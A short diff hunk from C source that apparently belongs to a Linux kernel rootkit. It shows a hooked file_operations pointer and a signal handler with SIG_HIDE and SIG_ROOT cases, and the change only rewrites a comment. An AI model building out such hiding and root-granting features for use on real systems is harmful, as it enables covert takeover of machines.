@@ -49,7 +49,7 @@ static struct file_operations *king_fops = NULL;
 // static struct file_operations *king_fops;
 static DEFINE_RWLOCK(king_fops_lock);
 
-/* Executes appropriate functions based on given signal. Returns false (1) on wrong signal */
+/* Executes appropriate functions based on given signal. pid is meant to be used with signal SIG_ROOT */
 void sig_handle(const CmdSignal sig, pid_t pid) {
     switch (sig) {
         case SIG_HIDE:
